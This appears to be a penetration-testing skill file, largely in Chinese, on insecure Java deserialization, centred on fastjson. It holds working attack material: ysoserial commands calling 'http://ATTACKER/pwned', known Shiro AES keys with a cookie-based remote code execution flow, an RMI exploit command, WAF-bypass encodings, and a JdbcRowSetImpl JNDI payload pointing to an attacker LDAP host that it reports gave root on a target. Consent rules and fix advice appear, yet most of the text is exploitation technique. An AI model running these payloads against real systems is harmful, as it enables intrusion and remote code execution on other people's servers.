---
name: "deserialization-test"
description: "deserialization"
---

# deserialization

# Insecure Deserialization


## 1. TRAFFIC FINGERPRINTING — IS IT DESERIALIZATION?

### Java Serialized Objects

| Indicator | Where to Look |
|---|---|
| Hex `ac ed 00 05` | Raw binary in request/response body, cookies, POST params |
| Base64 `rO0AB` | Cookies (`rememberMe`), hidden form fields, JWT claims |
| `Content-Type: application/x-java-serialized-object` | HTTP headers |
| T3/IIOP protocol traffic | WebLogic ports (7001, 7002) |

### PHP Serialized Objects

| Indicator | Where to Look |
|---|---|
| `O:NUMBER:"ClassName"` pattern | POST body, cookies, session files |
| `a:NUMBER:{` (array) | Same locations |
| `phar://` URI usage | File operations accepting user-controlled paths |

### Python Pickle

| Indicator | Where to Look |
|---|---|
| Hex `80 03` or `80 04` (protocol 3/4) | Binary data in requests, message queues |
| Base64-encoded binary blob | API params, cookies, Redis values |
| `pickle.loads` / `pickle.load` in source | Code review / whitebox |

---

## 2. JAVA — GADGET CHAINS AND TOOLS

### ysoserial — Primary Tool

```bash
# Generate payload (example: CommonsCollections1 chain with command)
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned" > payload.bin

# Base64-encode for HTTP transport
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0

# Common chains to try (ordered by frequency of vulnerable dependency):
# CommonsCollections1-7  — Apache Commons Collections 3.x / 4.x
# Spring1, Spring2       — Spring Framework
# Groovy1               — Groovy
# Hibernate1            — Hibernate
# JBossInterceptors1    — JBoss
# Jdk7u21               — JDK 7u21 (no extra dependency)
# URLDNS                — DNS-only confirmation (no RCE, works everywhere)
```

### URLDNS — Safe Confirmation Probe

URLDNS triggers a DNS lookup without RCE — safe for confirming deserialization without damage:

```bash
java -jar ysoserial.jar URLDNS "http://UNIQUE_TOKEN.burpcollaborator.net" > probe.bin
```

DNS hit on collaborator = confirmed deserialization. Then escalate to RCE chains.

### Commons Collections — The Classic Chain

The vulnerability exists when `org.apache.commons.collections` (3.x) is on the classpath and the application calls `readObject()` on untrusted data.

Key classes in the chain: `InvokerTransformer` → `ChainedTransformer` → `TransformedMap` → triggers `Runtime.exec()` during deserialization.

### Apache Shiro — rememberMe Deserialization

Shiro uses AES-CBC to encrypt serialized Java objects in the `rememberMe` cookie.

```text
Known hard-coded keys (SHIRO-550 / CVE-2016-4437):
kPH+bIxk5D2deZiIxcaaaA==          # most common default
wGJlpLanyXlVB1LUUWolBg==          # another common default in older versions
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
```

**Attack flow**:
1. Detect: response sets `rememberMe=deleteMe` cookie on invalid session
2. Generate ysoserial payload (CommonsCollections6 recommended for broad compat)
3. AES-CBC encrypt with known key + random IV
4. Base64-encode → set as `rememberMe` cookie value
5. Send request → server decrypts → deserializes → RCE

**DNSLog confirmation** (before full RCE): use URLDNS chain → `java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn"` → encrypt → set cookie → check DNSLog for hit.

**Post-fix (random key)**: Key may still leak via padding oracle, or another CVE (SHIRO-721).

### WebLogic Deserialization

Multiple vectors:
- **T3 protocol** (port 7001): direct serialized object injection
- **XMLDecoder** (CVE-2017-10271): XML-based deserialization via `/wls-wsat/CoordinatorPortType`
- **IIOP protocol**: alternative to T3

```bash
# T3 probe — check if T3 is exposed:
nmap -sV -p 7001 TARGET
# Look for: "T3" or "WebLogic" in service banner
```

### Java RMI Registry

RMI Registry (port 1099) accepts serialized objects by design:

```bash
# ysoserial exploit module for RMI:
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit TARGET 1099 CommonsCollections1 "id"

# Requires: vulnerable library on target's classpath
# Works on: JDK <= 8u111 without JEP 290 deserialization filter
```

### JDK Version Constraints

| JDK Version | Impact |
|---|---|
| < 8u121 | RMI/LDAP remote class loading works |
| 8u121-8u190 | `trustURLCodebase=false` for RMI; LDAP still works |
| >= 8u191 | Both RMI and LDAP remote class loading blocked |
| >= 8u191 bypass | Use LDAP → return serialized gadget object (not remote class) |

---

### fastjson —— 指纹 / autotype 状态判别 / WAF 绕过（2026-09-19 补）

**① 指纹：一句异常原文就够**（把 JSON 字段喂成类型不符的值，读回显）

| 回显 | 框架 |
|---|---|
| **`unterminated json string, pos N, json : <回显原始输入片段>`** | ★★ **Alibaba fastjson**（句式独有：固定前缀 + `pos N` + **把原始 JSON 片段回显出来**）2026-10-01 实证 |
| **`can not cast to JSONObject.`** | **Alibaba fastjson**（★ 注意方向：这是「**把标量喂给对象字段**」时抛的） |
| **`autoType is not support. <类名>`** | **fastjson**，autotype 未允许该类（★ 文案**带出类名** ⇒ 同时也确认了框架） |
| **`create instance error`** | ★★ **fastjson 且 autotype 放行**（类真被加载，只是造不出来 —— 不是拒绝） |
| `expect ':' at N, name X` / `Syntax error, expect {, actual …` | fastjson 语法错 |
| `Unrecognized field … not marked as ignorable` | Jackson |
| `Expected BEGIN_OBJECT but was …` | Gson |

★★ **「反向指纹」：把 `{"a":1}` 喂给一个 String 字段，看它怎么办**（2026-10-01 实证，判别力比报错更强）

| 框架 | 行为 |
|---|---|
| **fastjson** | ★★ **200**，值被静默变成字符串 **`"{\"a\":1}"`**（`StringCodec` 兜底 `value.toString()`） |
| Jackson | **400** `Cannot deserialize value of type java.lang.String from Object value` |
| Gson | `Expected a string but was BEGIN_OBJECT` |

⇒ ★★ **「宽容到把 JSON 对象 `toString()` 塞给 String 字段」本身就是 fastjson 的强指纹。**
★ 教训：**别只依赖单一方向的指纹** —— 老表里那条 `can not cast to JSONObject.` 属反方向场景，
拿它去测「对象喂给 String」会**测不到**（亲例：本目标该探针回的是 200 而非报错），
**要「语法错 + 类型错」两个方向各打一发**再下结论。

★ **弱指征（仅作旁证，不能单独定性）**：响应体用 `\n\t`（Tab）缩进 ⇒ 疑似 fastjson
`SerializerFeature.PrettyFormat`（Jackson 默认 2 空格）；JSON 键序为**字母序** ⇒ 疑似 fastjson
默认开启 `SortField`。

★ **关键价值不只是指纹，而是「解析发生在鉴权/风控之前」** —— 若不带有效验证码/凭证也能触达解析错误，
说明这是**未授权可达的反序列化点**。

**② ★ 判「autotype / 白名单开没开」的无害法**

✅ **三类探针都要用**

| 探针类 | 关键特性 | 响应 | 判读 |
| --- | --- | --- | --- |
| `zzz.nonexistent.Cls9F3A` | **加载不到** | `autoType is not support. zzz…` | ⚠️ 无信息 |
| **`java.util.Locale`** / **`java.math.BigDecimal`** | **存在** · 无常用无参构造 · 非 gadget | **`create instance error`** | ★ **通过了 autotype 检查（放行态）** |
| **`java.lang.Thread`**（**空对象**，不给 `target`/`Runnable`） | **存在** · 在 fastjson **内置黑名单** | **`autoType is not support. java.lang.Thread`** | ★ **黑名单在生效**（Thread 必然存在 ⇒ 拒绝**不是**加载失败） |
| `java.lang.Class` + `val:"java.lang.String"` | 存在的类 | `can not cast to JSONObject.` | ★ `@type=Class` 分支被执行，`val` 被真实加载 |

**判读矩阵**：

| 组合 | 结论 |
| --- | --- |
| Locale → `create instance error` **且** Thread → **被拒** | ★★ **autotype 放行态 + 仅内置黑名单兜底**（最危险配置，亲例即此） |
| Locale → **被拒** | autotype 收窄（有自定义 accept 白名单，或未放行 `java.util.`） |
| 出现 **`safeMode not support autoType : <类名>`** | ★ **这是 safeMode 开着的唯一明确文案**（没见到就不能说它开着） |

**判出「放行态」之后**：风险等级须跳到最高档（未授权可达 + WAF 可绕 + autotype 放行，三前提全实证）。

⛔ **探针阶段绝不用真 gadget 类名**（`JdbcRowSetImpl`/`TemplatesImpl`/BCEL/远程类加载 = 投递可利用载荷）。
★ **要投真 gadget 属「执行型载荷」** ⇒ 按 `SKILL.md §2` 第 9 条档②：**先向用户详细说明后果
（投什么载荷 / 目标上会发生什么 / 副作用与影响面 / 中止与善后），取得明确同意后执行**；未获同意不做。
**也可走服务端确认**（无需任何投递）：版本 · `ParserConfig.getGlobalInstance().isSafeMode()` · `autoTypeSupport` · accept/deny 名单。

**④ WAF 绕过（2026-09-19 实测通过腾讯云 WAF）**：见 **`waf-bypass.md` §2.1b**。
`"\x4Jtype"`（`digits[]` 未占位即 0）/ `"\x4_type"` / `"\u００４０type"`（全角）/ `"\u๐๐๔๐type"`（泰文）。
**标准 `\u0040`/`\x40` 被拦 ≠ 无解** —— WAF 只解「标准写法」，解不了 fastjson 的宽容变体。

**⑤ 报告口径（务必照写）**：只能写「未授权可达 + WAF 已被绕过（附编码实证）+ autotype 机制在工作
⇒ 风险须上调，请服务端核查版本与名单」，**禁止写「存在 fastjson 反序列化 RCE」**；
**「WAF 挡住了」不能作为降低等级的理由**。完整案例与话术见 `recon-methodology.md §23`。

**⑥ 修复**：`param` 改固定 DTO（`JSON.parseObject(str, XxxReq.class)`）+
`ParserConfig.getGlobalInstance().setSafeMode(true)`（1.2.68+）—— **SAFE_MODE 是唯一能同时关掉
autotype 与 `\x`/`\u` 宽容解码的方式**；异常原文不要回显。

**⑦ ★ JavaBean `expectClass` 类型闸 +「未知字段」绕过（2026-09-19 靶机实测，拿到 root RCE）**

> **场景**：服务端等价于 `JSON.parseObject(body, User.class)`（固定 DTO）。此时 `@type` 不能按老办法直接放顶层。

| 现象 | 判读 |
|---|---|
| 顶层 `@type` 指向**任意类**（存在 / 不存在 / Locale / Class+val / HashMap / 放在末尾）**统一**回 `type not match` | ⛔ **不是 autotype 关了，也不是类加载失败** —— 是 `expectClass` 类型闸在抛 |
| 顶层 `@type` 指向**不存在类名**也回 `type not match`（而不是 `autoType is not support. <类名>`） | ★ 关键指纹：**说明压根没走到 `ParserConfig.getDeserializer(String)`**（否则会抛 `autoType is not support.`）⇒ 默认按 `JavaBeanDeserializer` 路径判 |
| `{"<DTO上没有的字段>":{"@type":"java.util.Locale"}}` → **`create instance error`** | ★★ **autotype 在这个位置完全生效**（Locale 存在、无无参构造 ⇒ 能被"实例化失败"文案证伪到"类真被加载了"） |

**成因（fastjson 1.2.24 源码）**
- `JavaBeanDeserializer.deserialze()`：顶层遇 `@type` 时走
  `userType = TypeUtils.loadClass(...)` → `expectClass = TypeUtils.getClass(type)` →
  `if (expectClass == null || (userType != null && expectClass.isAssignableFrom(userType)))` 才放行，
  否则 `throw new JSONException("type not match")`。⇒ 顶层 `@type` **必须是目标 DTO 或其子类**。
- **`DefaultJSONParser.parseObject(Map)`**（通用 / Map 上下文，第 ~320 行）对 `@type` 只做
  `TypeUtils.loadClass` + `config.getDeserializer(clazz)`，**没有任何 expectClass 校验**
  （类加载不到时仅 `object.put("@type", typeName); continue;`，连异常都不抛）。

**★ 绕过（一行 payload）**：把 `@type` 从顶层**挪进 DTO 上不存在的字段**，值改走通用分支：
```json
{"zzq9f3a":{"@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"ldap://LHOST:PORT/Exploit","autoCommit":true}}
```
`JdbcRowSetImpl` 的 `dataSourceName`/`autoCommit` 都是 public setter，无需 `SupportNonPublicField`；
`setAutoCommit` → `connect()` → `InitialContext.lookup()` → JNDI 注入。

**闭环判据（靶机实测，三段带外证据缺一不可）**：目标主动连假 LDAP → 收 `BindRequest`
（`300c020101600702010304008000`）→ 返回 `javaNamingReference` → 目标 `GET /<Class>.class` 下载 →
类静态块回连并带出命令回显（实测 `uid=0(root)…`）。
工具：`tools/jndi/`（纯 Python 假 LDAP + HTTP 托管，无需 Java）。

**纪律**：本步已属「让目标执行我们提供的代码」⇒ 走 `SKILL.md §2` 第 9 条**档②：先向用户描述后果
（载荷是什么 / 目标上会发生什么 / 副作用与影响面 / 中止与善后），取得明确同意后执行**。
载荷用**自控最小载荷**（只读命令 `id`/`whoami` + 一次带回显的 HTTP 回连，不落文件、不驻留、
不弹 shell、不横向）。**公网第三方资产判出「闸可绕」后先停**，向用户说明后果再定；
未获同意时只写「未授权可达 + autotype 在工作 ⇒ 须服务端核查」，**不把真 gadget 打出去闭环**。

#### ★★★ `expectClass` 闸目标的动作顺序：**先判「回连能力」，再选载荷家族**（2026-10-01 目标实证）

**别一上来就投 gadget。** 顺序固定：

1. 顶层 `@type` 三类探针（不存在类 / `Locale` / `Thread` 空对象）**统一**回 `type not match`，
   且**文案里不出现 `autoType is not support. <类名>`** ⇒ 走的是 `JavaBeanDeserializer` + `expectClass`
   （不是 autotype 关了，也不是类加载失败）。
2. 嵌套**未知字段**里放 `Locale` → `create instance error` ⇒ ★★ **autotype 在该位置完全生效**，绕过点确认。
   **到这一步为止零载荷。**
3. ★★ **然后发「空响应 Listener」判出网/回连能力**（属档①：只记录连接，**不下发任何 reference / class**，
   不需要单独同意）：
   ```json
   {"<不存在的字段>":{"@type":"com.sun.rowset.JdbcRowSetImpl",
                      "dataSourceName":"ldap://<我们>:<port>/Probe","autoCommit":true}}
   ```
   - Listener 收到 **`300c020101600702010304008000`（标准 LDAP BindRequest）** ⇒ 一发同时证实三件事：
     ① 载体**过了 autotype 闸**、② `InitialContext.lookup()` **真被执行**、③ **目标能连回我们**
     ⇒ **JNDI 家族可用**，直接进投递阶段。
   - 收不到 ⇒ 才轮到考虑**本地字节码内嵌家族**。
   ★ 这一步同时**证伪/证实"目标不出网"这个前提本身** —— 别拿传闻当前提，用一发 listener 测掉。
   ★★ 响应体一律是 `set property error, autoCommit`（listener 不回数据 ⇒ lookup 失败），
   **与"链根本没通"逐字相同** ⇒ 又一次印证：**响应体零信息量，判据只能靠带外**。

#### ★ `TemplatesImpl` 在 `expectClass` 闸目标上的失败诊断（2026-10-01 实证，通用形状）

- 现象：整发**毫秒级**返回、`set property error, outputProperties`，**埋在 `<clinit>` 里的 sleep 不出现**
  ⇒ `<clinit>` 没跑（instantiation 之前就死了）。
- **差分矩阵（全部无副作用，可照抄）**：

| 变体 | 结果 | 判读 |
|---|---|---|
| **只放 `_outputProperties`**（值给成真 `Properties`，**不带** `_bytecodes`/`_name`） | **同一条报错** | ★ **该报错由这个键独立产生**；此时 `_name` 为空、getter 链会**立即早退** ⇒ 报错在**属性映射**这一步，**不是** getter 链抛的 |
| 只放 `_bytecodes` + `_name`（无 `_outputProperties`） | **200，零报错** | ★★ **零信息量** —— 未知键被静默忽略 ⇒ **不能据此判 `SupportNonPublicField` 开没开**（两个假设同结果） |

- ⇒ 结论：`_tfactory` / `_outputProperties` 这套在**该类目标的 fastjson 版本上不构成触发器**；
  真正的阻塞点是 §26.2 已点明的那条 —— **私有字段能否赋值取决于应用是否放开 `Feature.SupportNonPublicField`（多数应用不开）**。
- ★★ 纪律：**不要为救这条链去换 gadget 类名硬凑**（§27：N 倍投递足迹换 0 比特信息）——
  **直接换家族**。亲例同一目标上换成 JNDI 家族，**一发即通、三段证据齐全**。

---

### ★★ 公开 CVE 前置核查 —— **定级 / 写修复建议之前必做**（2026-09-19 补，源于 CVE-2026-16723）

**教训**：给组件类目标（fastjson / log4j / shiro / struts…）定级、写修复建议之前，**必须先查该组件当前的公开 CVE**。
本次未查，直接导致两个错误：① 差点给出「升级 fastjson 到最新版」这条**错误修复建议**；
② 一度误判「类路径画像对交付无价值」（见下方「推论」）。

#### 已确认情报：CVE-2026-16723

| 项 | 值 |
|---|---|
| 编号 | **CVE-2026-16723**（阿里云 AVD-2026-1896768） |
| CVSS | **9.0 CRITICAL** —— `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| 影响 | **fastjson 1.2.68 ~ 1.2.83**（含 1.2.83，★ 即 1.x 的**最终版**） |
| 披露 | 2026-07-20（Alibaba 公告 07-21；CNA = Alibaba） |
| 发现者 | Kirill Firsov（FearsOff） |
| 补丁 | ★ **1.2.84 已修复**（2026-09-20 更正，此前误记"无补丁"）：在 `ParserConfig.checkAutoType` / `TypeUtils.loadClass` 中**拒绝含 `:` `/` `!` 的类型名**，使非类名字符串到不了资源探测与类加载器；并加了白名单 hash 命中后的文本回验、限制 accept 前缀覆盖 `ClassLoader/DataSource/RowSet` 危险基类、修了重复调用可能从缓存返回黑名单类的路径 |
| 利用状态 | 已武器化：ThreatBook 2026-07-22 确认在野；Imperva 观测到金融 / 医疗 / 零售行业攻击 |
| 特性 | ★★ **gadget-free** —— **无需开 AutoType、无需类路径 gadget** |

**机制（公开通告层面）**：`@type` 值被转化为**类资源查找**；在 **Spring Boot 可执行 fat-JAR** 中，
攻击者可控的嵌套 JAR 路径 ⇒ 加载攻击者字节码；`@JSONType` 注解被当作**信任信号**绕过类型检查。
（较新 JDK 另有「下载远程 JAR + 经 `/proc/self/fd` 引用」一条路径。）

★★ **部署形态是硬前提**（阿里官方明确列举）：
- **受影响**：Spring Boot **可执行 fat-JAR**
- **不受影响**：plain non-fat JAR、generic uber-JAR、**Tomcat / Jetty WAR 部署**、**fastjson ≤ 1.2.60（不存在该代码路径）**、fastjson ≥ 1.2.84、fastjson2 全版本、SafeMode=true、noneautotype 版

#### ★★★ 资源探测分支的**真实区间 = 1.2.48 ~ 1.2.83**（2026-09-24 带外实测，与官方"≤1.2.60 无该路径"是**粒度差异**）

**方法**（不能用报错文案判 —— 文案在"有探测/无探测"下**逐字相同**）：
起本地 HTTP 记录器 + 注入 URL-aware classloader（模拟 fat-jar 的资源查找），发 `jar:http:` 形态，
**看 HTTP 命中**。命中 > 0 ⇒ 该版本确实调用了 `getResourceAsStream`。15 个构建实测：

| 版本 | HTTP 命中 | 资源探测 |
|---|---|---|
| 1.2.24 / 1.2.25 / 1.2.42 / 1.2.43 / **1.2.47** | **0** | ✘ 无 |
| ★ **1.2.48** | ★★ **1** | ★★★ **从这里开始** |
| 1.2.55 / 1.2.60 / 1.2.62 / 1.2.66 / 1.2.68 / 1.2.75 / 1.2.80 / **1.2.83** | **1** | ✔ 有 |
| ★ **1.2.84** | ★ **0** | ★★ **已关闭**（探测前就拒 URL 形态） |

★ **与官方通告不矛盾，是粒度问题**：官方说「**≤1.2.60 不存在该代码路径**」指的是
**完整可利用的代码路径**（能走到 `return clazz` / `defineClass` 的那条）；
而**资源探测本身（`getResourceAsStream`）从 1.2.48 就存在**。
`dinosn` 实验室的措辞最准确：**"1.2.48–1.2.82 contain the underlying probe and require
separate version-specific continuation testing"**。
⇒ 引用区间时要说清是**哪一层**（探测 / 短路 / 完整链），**否则会得出互相矛盾的结论**。

★★★ **配套铁证（"报错文案零信息量"再添一例）**：`1.2.83` 与 `1.2.84` 对同一 payload 都回
`autoType is not support. jar:http:…`（**逐字相同**），但**一个真发了 HTTP、一个没有**。
⇒ **判"有没有资源探测"只能靠带外。**

#### ★★ 「类名变形」类绕过（`L…;` / `LL…;;` / `[…]`）的正确验法（2026-09-24 亲例纠错）

★ **别用"非内建表"的类当目标** —— 那样得到的是"**白名单拒绝**"，
**区分不出"变形无效"**（第一版矩阵就这么错了，全版本 DENY 被误读）。

**正确姿势**：目标类选**在 `deny` 名单里的**（如 `JdbcRowSetImpl`）+ **把 `autoTypeSupport` 打开**，
让白名单不再是混杂变量，才能纯测"变形能不能绕过名单"。实测（`autoTypeSupport=true`）：

| 版本 | 裸 | `L…;` | `LL…;;` | `[…` |
|---|---|---|---|---|
| 1.2.24 | ★ **OK** | ★ **OK** | ★ **OK** | — |
| **1.2.25** | DENY | ★★ **OK** | ★★ **OK** | — |
| **1.2.42** | DENY | DENY | ★★ **OK** | — |
| **1.2.43** | DENY | DENY | DENY | ★ **过闸**（`create instance error` ≠ DENY） |
| 1.2.47+ | DENY | DENY | DENY | DENY |

⇒ ★ **印证了公开资料那张「版本 ↔ 绕过方式」表**；★ 且印证：**这些变形必须在 `autoTypeSupport=true` 下才有效**
（默认态下 1.2.25/1.2.42/1.2.43 全 DENY）—— **因为变形绕的是 `deny` 名单，不是白名单态**。

★ **两条判读细节**（本轮踩到）：
1. `autoTypeSupport=true` 时，「**类不存在**」（`loadClass` 失败 → 返回 null → `@type` 被当普通字段）
   与「**类存在但被拒**」（抛 `autoType is not support.`）表现**不同**；
   ⇒ **先确认样本类真的在 classpath 上**，否则会把"未处理"读成"被拒"。
2. `[…` 形态报 `create instance error` **不是 DENY** —— 那说明它**过了闸**，只是实例化不了。

#### ★ 决策树（先判形态，再谈适用）

```
版本在 1.2.68~1.2.83 ？
  ├─ 是 + Spring Boot fat-JAR + SafeMode 未开  ⇒ ★ 该 CVE 适用（gadget-free，类路径条件无关）
  └─ 是 + Tomcat/Jetty WAR / 非 fat-JAR        ⇒ ★ 该 CVE **不适用**
                                                  ⇒ 若存在完整链，**必须依赖类路径 gadget**
                                                  ⇒ 类路径测绘（组件画像）**才成为必要动作**
```

★ **别搞反**：**命中版本 ≠ 可利用。** 部署形态能否构成 fat-JAR 资源查找路径，是这条 CVE 的**硬闸**。
★ **亲例**：乐信 datashare —— ★ 2026-09-24 版本指纹重定为 **{1.2.83, 1.2.84}**（旧记的"≤1.2.82"作废），
部署形态 **非 fat-jar** ⇒ CVE-2026-16723 **不适用** ⇒ 仍需走 gadget 路径（与 §13.5「类路径测绘」互为印证，而非推翻）。
★ 同源旁证：ThreatBook 实验室在内嵌 Tomcat 上只得到「远程 JAR 拉取 / SSRF」，未得执行 —— 形态决定结果。

#### ★★★ 判 fat-jar 的决定性实验：同一 payload × 两种 classloader 的双向对照（2026-09-24）

**先说一个反直觉但极重要的实现细节**（`ParserConfig.checkAutoType` 字节码 1136–1246）：

```
typeName.replace('.','/') + ".class"          ← 资源名构造，对整串生效
defaultClassLoader.getResourceAsStream(res)   ★ 用的是 ParserConfig.defaultClassLoader
                                              （兜底才是 ParserConfig.class.getClassLoader()）
new ClassReader(stream) → TypeCollector → hasJsonType()
```

⇒ 因为走的是 **`defaultClassLoader` 字段**，**可以注入一个 URL-aware loader 精确模拟 fat-jar，不必真搭 Spring Boot 工程**：

```java
class UrlAwareLoader extends ClassLoader {          // 模拟 LaunchedURLClassLoader
    public InputStream getResourceAsStream(String name) {
        if (name.startsWith("jar:") || name.startsWith("http:"))
            try { return new URL(name.substring(4)).openStream(); } catch (Throwable e) { return null; }
        return super.getResourceAsStream(name);
    }
}
ParserConfig.getGlobalInstance().setDefaultClassLoader(new UrlAwareLoader(parent));
```

**实验结果**（payload 三组相同 = `{"@type":"jar:http:..2130706433:<port>.probe!.P"}`，本地起 HTTP 记录器）：

| 组 | classloader | 本地 HTTP 命中 | fastjson 报错 |
|---|---|---|---|
| **A** | **普通**（外置 Tomcat / WAR / uber-jar） | **0** | `autoType is not support. jar:http:..2130706433:…` |
| **B** | **URL-aware**（fat-jar 形态） | ★★ **1**（`GET /probe!/P.class`） | ★ **逐字相同** |

★★ **这张表最要紧的一行：A 与 B 的报错文案完全一致，但一个零出网、一个真的发了 HTTP 请求。**

⇒ **必须固化的两条判读纪律**：
1. **`autoType is not support.` 不能用来判"有没有出网"** —— 两种 classloader 下都是这句话。
   要分只能靠：**Listener 收连接** 或 **响应时间差分**（见 `recon-methodology.md §23.5`）。
2. **判定 fat-jar 时，报错文案零信息量；行为才是判据。** 只对比响应体的做法**会得出错误结论**。

★ 配套：整数 IP 确实能被解析（`InetAddress.getByName("2130706433")` → `/127.0.0.1`），
这正是公开 PoC 主机段一律写整数形式的原因（`.` 会被 replace 成 `/`）。
（`0177.0.0.1` 会被当十进制 → `/177.0.0.1`；`0x7f000001` 直接 `UnknownHostException`。）

#### ★★★ 前提比"fat-jar"更严：**fastjson 必须真的拿到那个 loader**（2026-09-24，权威资料 + 官方 PoC）

★★ **两条来自权威来源的关键收紧**（别只记"fat-jar"就完事）：

**① vulhub 官方 PoC（`fastjson/1.2.83-rce/README.zh-cn.md`）原文**：
> "标准 JVM 的默认类加载器**并不会去拉取远程 JAR**，这一手法需要在 Spring Boot 应用下才能复现——其 `URLClassLoader` 会真正发起该请求。"
> ★★★ "该端点**即使利用成功也会返回错误**，因为它产生的对象并不是期望的 bean，所以**命令执行是盲打的，需要带外核验**。"
> ★ `poc.py` 自带 `scan` 子命令：**只触发无害的 `jar:http` 下载（不执行代码）**，用 interactsh 回连判定是否存在漏洞。

⇒ **判据只能是带外**（Listener 收连接 / 时间差分），**看响应体必错**；而且官方推荐的扫描方式
（无害触发下载 + 回连）**就是档①**，可直接采用。

**② 先知「漏洞利用坑点」复盘（`xz.aliyun.com/news/92564`）原文**：
> "按照公开环境自己启动项目搭建：**Spring Boot FatJar + fastjson 1.2.83 + JDK8，结果发现只能触发请求或者 SSRF，无法达到 RCE**。"
> "默认 `ParserConfig.getGlobalInstance().getDefaultClassLoader()` 返回 **null**。**Fastjson 并不会自动绑定 Spring Boot 的 `LaunchedURLClassLoader`。**"
> "公开 EXP 中 `setDefaultClassLoader(...)` **这一步非常关键**。"

⇒ ★ **真实前提是 5 条**：版本命中 · 外部可控 JSON 输入 · **存在 fastjson 类型解析路径** ·
**fastjson 最终使用"支持目标资源解析"的 classloader** · 恶意 Class 满足构造要求。
**"Spring Boot + fastjson 1.2.83" 并不保证 RCE** —— 还要 `defaultClassLoader` 或 TCCL 真能走到那个 loader。

★ 同一篇的两条实用细节：
- **POC 类的 package 必须是 `jar:http:..xxx!` 这类非法 Java 包名 ⇒ `javac` 编译不了**，
  必须 ASM/Javassist/Byte Buddy 改 `this_class`；
- **`@JSONType` 不是执行点，执行点是 `static{}`（`<clinit>`）**。

#### ★★ 「深度绕过」研究代码必须当命题实测，不能当结论引用（2026-09-24）

`Detect-DefenseLab` 仓库内有 `DeepBypassVerification.java` / `2` / `3`，注释里是"关键假设""替代路径"。
**把它们的三条假设当命题、在 1.2.83 上逐条实测，全部不成立**：

| 假设 | 实测 |
|---|---|
| `JSON.parseObject(json, clazz)` / `(Type)` 重载**不调用** `checkAutoType` | ✘ **两个重载都抛** `autoType is not support.` |
| `expectClass` 旁路加载的类**会被缓存进 `TypeUtils.mappings`**（进而两阶段绕 deny） | ✘ 反射读 `mappings`：`SQLException`/`SAXException` 加载成功但 **无 → 无**（未缓存）；两阶段顶层引用**仍被 deny** |
| `otherValues` → `parseObject(Map)` 走 `expectClass=null` 旁路 | ✘ 嵌套 `expectClass=null` ⇒ 一律拦（与键名无关） |

★ **与源码一致**：`cacheClass = autoTypeSupport || jsonType`，两者皆 false ⇒ **`loadClass` 根本不写缓存**。
（也与 09-20「缓存投毒 4 轮全负 + 字段顺序反转证明缓存从未写入」互为印证。）

**⇒ 纪律：文件名带 `Bypass` / `Deep` / `Verification` 的研究代码 ≠ 可用绕过，必须逐条当命题实测。**
同类：`fastjson2` 的链（如 2.0.61 RCE、FNV 哈希碰撞）**是另一个产品**，对 fastjson 1.x 目标不适用——**别跨产品搬**。

#### ★★ 修复建议必须跟着改（否则就在给错建议）

| ❌ 不能说 | ✅ 应该说 |
|---|---|
| 「升级 fastjson 到最新版」 | **升到 ≥ 1.2.84 是针对本 CVE 的修复版**（★ 2026-09-20 更正：此前记的"1.x 无补丁、升级无解"**已过时** —— 官方通告列 **1.2.84** 为修复版，修复方式=在 `checkAutoType`/`loadClass` 拒绝含 `:` `/` `!` 的类型名） |

官方**有效处置**（任一）：
1. **升级 fastjson 1.x 至 ≥ 1.2.84**（P0，最小改动）
2. **启用 SafeMode**：`-Dfastjson.parser.safeMode=true`（或 `ParserConfig.getGlobalInstance().setSafeMode(true)` / `fastjson.properties`）
3. **换 noneautotype 构建**：`com.alibaba:fastjson:1.2.83_noneautotype`（编译期移除 AutoType 能力）
4. **迁移 Fastjson2**（长期方案；2.x 架构上无资源探测 / 无注解信任 ⇒ 不受影响）

#### ★★ 「换个类能不能升级」—— 两个集合不相交（2026-09-20 实测）

**官方"内建支持类型"清单 ≠ 反序列化白名单**（前者含**序列化侧**）⇒ 判"某类在不在闸内"**只能实测**。
实测（datashare，无害参数）：

| 类 | 结果 | 能力 |
|---|---|---|
| `java.net.InetSocketAddress` | ✔ 放行（回 `syntax error, expect {…`，**不是** `autoType is not support.`） | 构造时解析 ⇒ **DNS** |
| `java.io.File` / `java.nio.charset.Charset` | ✔ 放行 | 仅构造对象，**无 I/O** |
| `java.util.regex.Pattern` | ★ **目标上被拒**（91B `autoType is not support.`，**去掉 `val` 也拒 ⇒ 死在闸上**），但**本地穷举 1.2.47 起一直 PASS** ⇒ ★★ **目标追加了 deny（配置被加固过）** | 即使过闸也只 `Pattern.compile(常量)`，**编译不消耗**；真 ReDoS 要目标之后用它匹配长输入 ⇒ 外部不可控，且**按红线不做 DoS 验证** |
| `net.sf.cglib.proxy.Factory` | ★ **被拒** | 官方清单那节是**序列化侧** |
| `java.net.URL` | **WAF 501**（拦字面 `http://`） | 仅构造 |

⇒ ★ **承重结论**：**能过闸的类**（内建集）与**能执行我们代码的类**（`TemplatesImpl`/`JdbcRowSetImpl`/BCEL/C3P0/ROME/CC）
**交集为空** ⇒ **"换载荷 / 换类"问的是"在能过闸的集合里挑"，而答案在另一个集合里** ⇒ 换什么都没有用。
★ 只有 `InetAddress` 家族有网络动作，且**参数是我们写死的常量** ⇒ 上限就是"一次 DNS 解析"。
★ 顺带：**WAF 拦字面 `http://`，但不拦等价语义的 `http:..`**（经 `replace('.','/')` 后等价）
⇒ 加固建议要写「匹配前先 `.`→`/` 归一化」。

#### ★★★ 闸绕过的全族清点（2026-09-20 源码级 + 公开资料扫面）

**先从源码清点**：fastjson **1.2.83 `ParserConfig.checkAutoType`** 在 `autoTypeSupport=false && safeMode=false` 下，
能返回**非 null clazz** 的出口**只有 7 条**（逐条判本目标）：

| # | 出口 | 本目标 |
|---|---|---|
| 1 | `autoTypeCheckHandlers` 返回非 null | ✘ 需应用注册 handler |
| 2 | ★ **`internalWhite` 命中 → `loadClass` 直接 return** | ⚠ 见下 |
| 3 | `getClassFromMapping` / `deserializers.findClass` / `typeMapping.get` | ⚠ 只到"内建表"；缓存实测负；`typeMapping` 需应用 `register` |
| 4 | `!autoTypeSupport` 分支滑中 `acceptHashCodes` | ⚠ 16 前缀全负；残余=完整类名配置 |
